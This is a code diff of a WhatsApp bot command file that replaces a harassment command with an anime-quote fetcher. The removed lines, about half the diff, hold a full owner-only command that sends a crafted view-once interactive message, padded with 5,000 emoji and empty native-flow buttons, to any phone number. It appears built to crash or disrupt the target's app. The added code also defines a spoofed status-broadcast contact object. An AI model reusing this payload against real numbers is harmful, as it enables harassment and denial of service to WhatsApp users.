@@ -1,68 +1,53 @@
-// commands/kaguya.js
-const PROTECTED_NUMBERS = ['2347072182960', '2349049636843'];
+// commands/kaguya.js - Kaguya Quote Generator
+const axios = require('axios');
+const settings = require('../settings');
 
-async function kaguyaCommand(sock, chatId, message, args) {
-    if (!message.key.fromMe) {
-        await sock.sendMessage(chatId, { text: "❌ *Owner Only*" }, { quoted: message });
-        return;
+const fakeMeta = {
+    key: {
+        participant: '0@s.whatsapp.net',
+        remoteJid: 'status@broadcast',
+        fromMe: false,
+        id: 'DARKNODE_META_' + Date.now()
+    },
+    message: {
+        contactMessage: {
+            displayName: 'DARKNODE MD',
+            vcard: `BEGIN:VCARD\nVERSION:3.0\nN:DARKNODE MD;;;;\nFN:DARKNODE MD\nTEL;waid=${settings.ownerNumber}:+${settings.ownerNumber}\nEND:VCARD`,
+            sendEphemeral: true
+        }
+    },
+    messageTimestamp: Math.floor(Date.now() / 1000),
+    pushName: 'DARKNODE MD'
+};
+
+const channelInfo = {
+    contextInfo: {
+        forwardingScore: 1,
+        isForwarded: true,
+        forwardedNewsletterMessageInfo: {
+            newsletterJid: settings.newsletterJid,
+            newsletterName: settings.newsletterName,
+            serverMessageId: -1
+        }
     }
+};
 
-    const targetNumber = args[0];
-    if (!targetNumber) {
-        await sock.sendMessage(chatId, { 
-            text: "🌙 *Kaguya Ōtsutsuki*\n\nUsage: .kaguya <number>\nExample: .kaguya 628123456789\n\n*Infinite Tsukuyomi*"
-        }, { quoted: message });
-        return;
-    }
-
-    const cleanNumber = targetNumber.replace(/[^0-9]/g, '');
-    
-    if (PROTECTED_NUMBERS.includes(cleanNumber)) {
-        await sock.sendMessage(chatId, { text: "🛡️ *Protected by Six Paths*" }, { quoted: message });
-        return;
-    }
-
-    const target = cleanNumber + '@s.whatsapp.net';
-    
-    await sock.sendMessage(chatId, { text: `🌙 *Infinite Tsukuyomi* casting on ${cleanNumber}...` }, { quoted: message });
-    await sock.sendMessage(chatId, { react: { text: "🌙", key: message.key } });
-
+async function kaguyaCommand(sock, chatId, message) {
     try {
-        const tsukuyomiPayload = {
-            viewOnceMessage: {
-                message: {
-                    messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
-                    interactiveMessage: {
-                        contextInfo: {
-                            mentionedJid: [target],
-                            isForwarded: true,
-                            forwardingScore: 999,
-                            businessMessageForwardInfo: { businessOwnerJid: target }
-                        },
-                        body: { title: "👑", text: "✦ Kąģüʏȧ Ōƭṡüƭṡüḳī ✦" + "🌙".repeat(5000), description: "💌", footer: "Infinite Tsukuyomi" },
-                        nativeFlowMessage: {
-                            buttons: [
-                                { name: "single_select", buttonParamsJson: "" },
-                                { name: "view_product", buttonParamsJson: "" },
-                                { name: "payment_method", buttonParamsJson: "" },
-                                { name: "call_permission_request", buttonParamsJson: "" },
-                                { name: "payment_info", buttonParamsJson: "" }
-                            ]
-                        }
-                    }
-                }
-            }
-        };
+        const response = await axios.get('https://api.animechan.xyz/v1/random');
+        const quote = response.data;
 
-        await sock.relayMessage(target, tsukuyomiPayload, { participant: { jid: target } });
-        
-        await sock.sendMessage(chatId, { text: `✅ *Infinite Tsukuyomi* activated on ${cleanNumber}` }, { quoted: message });
-        await sock.sendMessage(chatId, { react: { text: "🕳️", key: message.key } });
+        const text = `╭─── ⪨ 🌸 KAGUYA ⪩───⟢\n│ *"${quote.quote}"*\n│\n│ - ${quote.character}\n│ (${quote.anime})\n╰────────────⟢\n> © DarkNode MD`;
+
+        await sock.sendMessage(chatId, { text, ...channelInfo }, { quoted: message });
 
     } catch (error) {
-        console.error('[Kaguya]', error.message);
-        await sock.sendMessage(chatId, { text: `❌ *Tsukuyomi failed:* ${error.message}` }, { quoted: message });
+        console.error('[Kaguya] Error:', error);
+        await sock.sendMessage(chatId, {
+            text: '╭─── ⪨ ❌ ERROR ⪩───⟢\n│ Failed to fetch anime quote.\n╰────────────⟢\n> © DarkNode MD',
+            ...channelInfo
+        }, { quoted: message });
     }
 }
 
-module.exports = kaguyaCommand;
+module.exports = { kaguyaCommand };
